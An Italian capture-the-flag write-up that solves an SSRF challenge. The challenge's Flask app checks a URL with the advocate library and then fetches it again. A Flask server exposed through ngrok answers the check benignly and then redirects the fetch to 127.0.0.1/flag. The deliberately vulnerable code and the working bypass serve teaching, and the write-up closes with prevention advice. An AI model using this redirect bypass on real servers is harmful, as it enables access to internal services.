SEETF2022 - Super Secure Request Forwarder

Esecuzione della sfida in locale

Per poter eseguire la sfida in locale effetuare il clone della repository :

 git clone https://github.com/pierde98/CTF.git

Entrare nella directory della sfida e istanziare il container Docker :

cd SEETF2022-SuperSecureRequestForwarder/challenge
docker-compose up -d

Il sito web della sfida è in esecuzione su: http://localhost:80/

Analisi preliminare

L’applicazione si presenta come una semplice pagina che consente di inserire un indirizzo e di restituire all’utente la pagina richiesta mascherando il proprio indirizzo ip.

Il nome della competizione ci suggerisce che ci troviamo di fronte ad una vulnerabilità SSRF (Server-Side Request Forgery).

Per approfondire SSRF

Il server-side request forgery (noto anche come SSRF) è una vulnerabilità della sicurezza web che consente a un aggressore di indurre l’applicazione lato server a effettuare richieste a una posizione non prevista.
In un tipico attacco SSRF, l’aggressore potrebbe indurre il server a effettuare una connessione a servizi esclusivamente interni all’infrastruttura dell’organizzazione. In altri casi, potrebbe essere in grado di forzare il server a connettersi a sistemi esterni arbitrari, facendo potenzialmente trapelare dati sensibili come le credenziali di autorizzazione.

(Leggi di più: https://portswigger.net/web-security/ssrf)

Per prima cosa possiamo analizzare il codice sorgente e si può notare che viene utilizzato il framework per applicazioni web Flask e il codice principale è in app.py.

from flask import Flask, request, render_template
import os
import advocate
import requests

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():

    if request.method == 'POST':
        url = request.form['url']

        # Prevent SSRF
        try:
            advocate.get(url)

        except:
            return render_template('index.html', error=f"The URL you entered is dangerous and not allowed.")

        r = requests.get(url)
        return render_template('index.html', result=r.text)

    return render_template('index.html')


@app.route('/flag')
def flag():
    if request.remote_addr == '127.0.0.1':
        return render_template('flag.html', FLAG=os.environ.get("FLAG"))

    else:
        return render_template('forbidden.html'), 403


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, threaded=True)

Questa applicazione utilizza la libreria Flask per creare un’applicazione web che accetta richieste GET e POST alla route “/”. Quando l’utente invia una richiesta POST con un URL, l’applicazione utilizza la libreria advocate per verificare che l’URL sia sicuro. In caso contrario, viene mostrato un messaggio di errore.
Se l’URL è considerato sicuro, l’applicazione utilizza la libreria requests per effettuare una richiesta GET sull’URL specificato e restituisce il contenuto della risposta come risultato.
Inoltre, la funzione flag() è associata alla route “/flag” e verifica l’indirizzo IP della richiesta. Se l’indirizzo IP è “127.0.0.1”, la funzione restituisce il contenuto del file flag.html con la variabile FLAG.
Se l’indirizzo IP non è “127.0.0.1”, la funzione restituisce il contenuto del file forbidden.html e un codice di stato 403 Forbidden.

L’istruzione “if” quindi contiene i requisiti specifici che dobbiamo soddisfare per ottenere il flag. La richiesta deve provenire dall’indirizzo 127.0.0.1 invece che dall’ip pubblico.

Risoluzione

Un primo tentativo è quello di provare ad ottenere il flag inserendo direttamente l’indirizzo http://127.0.0.1/flag

Questo è quello che si ottiene :

Viene visualizzato un messaggio di errore che ci dice che l’URL che abbiamo inserito è pericoloso e non è consentito.

In effetti sullo script app.py viene utilizzata una libreria di nome advocate che, come ci suggerisce anche il commento, protegge il sistema dagli attacchi SSRF.

Effettuando un ricerca su questa libreria, vediamo che advocate è un insieme di strumenti basati sulla libreria requests per effettuare in modo sicuro richieste HTTP per conto di terzi. In particolare, mira a prevenire le tecniche comuni che consentono gli attacchi SSRF.

A questo punto, possiamo vereficare se sono presenti vulnerabiltà nella libreria advocate ;
nel file requirements.txt che ci viene fornito vediamo che la versione utilizzata è la 1.0.0.

Per verificare eventuali vulnerabilità possiamo utilizzare Snyk Advisor, uno strumento che monitora i pacchetti open source e che fornisce una valutazione sulla sicurezza, segnalando eventuali problemi.

Vediamo che non ci sono problemi di sicurezza noti ma comunque questa libreria non sembra essere molto popolare, e la versione 1.0.0 è stata pubblicata tre anni e risulta essere la più recente.
È molto probabile che la libreria si limiti semplicemente controllare l’URL.
Per cui proveremo ad utilizzare una delle tecniche che ci aiutano a sfruttare gli SSRF.

Molti filtri SSRF controllano se l’url punta a una risorsa proibita, ad esempio localhost. Se l’url è corretto, non fanno altro. Per ingannarli possiamo eseguire un nostro server web che avrà un indirizzo corretto che non verrà considerato dannoso, ma poi risponderà con il codice http di reindirizzamento e trasferirà la richiesta all’host locale. Quindi, alla fine, il server che stiamo attaccando farà la richiesta che non dovrebbe fare.

Per prima cosa vediamo se può accedere ad un indirizzo esterno.

Posizionandosi con il terminale all’interno della directory della sfida, usiamo il seguente comando per esegurire un semplice server HTTP locale sulla porta 1337

python -m http.server 1337

A questo punto digitando sul browser localhost:1337, possiamo accedere a tutti i file prensenti nella directory.

Ora per esporre la directory sul web utilizzeremo il servizio ngrok, che fornisce un URL Web, accessibile pubblicamente, a qualsiasi applicazione ospitata localmente.

ngrok http 1337

A questo punto vediamo cosa succede se forniamo un semplice script.

(exploit.js prensente all’interno della directory della sfida)

<Script>alert(0)</Script>

Quindi provando ad accedere a exploit.js otteniamo il pop-up. Possiamo controllare la sorgente e vedere che lo script è effettivamente presente.

Per cui, possiamo sfruttare uno script che deve raggirare il controllo SSRF. Una possibile soluzione è la seguente:

(Disponibile nella subdirectory solution della sfida)

from flask import Flask, redirect, request

app = Flask(__name__)
check = True

@app.route("/")
def index():
    return "<a href='https://www.google.com'></a>"


@app.route("/exploit", methods=['GET', 'POST'])
def handle():
    global check
    if check:  # First request = benign
        check = False
        return "First request is benign, why wouldn't the second be?!"
    else:  # Second request = malicious
        check = True
        return redirect("http://127.0.0.1/flag", code=302)

L’applicazione web utilizza una variabile globale check per tenere traccia delle richieste effettuate. Quando l’attaccante invia una prima richiesta alla route “/exploit”, la variabile check è settata a true e la funzione restituisce il messaggio “First request is benign, why wouldn’t the second be?!” e imposta la variabile check a false. Al successivo invio di una richiesta alla stessa route, check è falso e la funzione effettua un redirect verso “http://127.0.0.1/flag” utilizzando la funzione redirect() di Flask con stato 302. In questo modo l’applicazione effettua una richiesta verso una risorsa interna non autorizzata e l’attaccante può avere accesso alle informazioni riservate presenti nella risorsa a cui è stata effettuata la richiesta, nel nostro caso il flag.

A questo punto verifichiamo cosa succede. Ci posizioniamo con il terminale all’interno della subdirectory solution ed eseguiamo l’applicazione Flask.

flask run

Lanciando l’applicazione Flask vediamo che viene utillizata la porta 5000. Per cui avviamo una nuova sessione ngrok come abbiamo fatto in precendenza.

ngrok http 5000

Ora non ci resta che copiare l’URL che ci viene fornito e inserirlo all’interno dell’applicazione aggiungendo “/exploit”.

A questo punto viene visualizzato il flag, la sfida è completata!

Come prevenire gli attacchi SSRF

Ci sono diverse tecniche si possono utilizzare per prevenire gli attacchi SSRF (Server-Side Request Forgery):

  • Convalidare accuratamente gli input: assicurarsi di verificare che gli indirizzi URL forniti dagli utenti siano validi e non contengano caratteri non validi.

  • Utilizzare whitelist di URL: impostare un elenco di indirizzi URL autorizzati e verifica che gli input degli utenti corrispondano a uno di questi indirizzi.

  • Limitare l’accesso alle risorse: limita l’accesso alle risorse sensibili solo agli utenti autorizzati.

  • Utilizzare librerie affidabili: utilizzare librerie esterne affidabili per gestire le richieste invece di scrivere il proprio codice per evitare eventuali falle di sicurezza.

  • Monitorare e registrare gli accessi: monitorare e registrare gli accessi alle risorse sensibili per identificare eventuali attività sospette.

  • Utilizzare il controllo degli accessi in base al contesto (CAC) per limitare l’accesso a risorse specifiche in base al contesto dell’utente e alla richiesta.

  • Utilizzare un firewall o un gateway di sicurezza per proteggere i tuoi sistemi e risorse dalle richieste esterne non autorizzate.
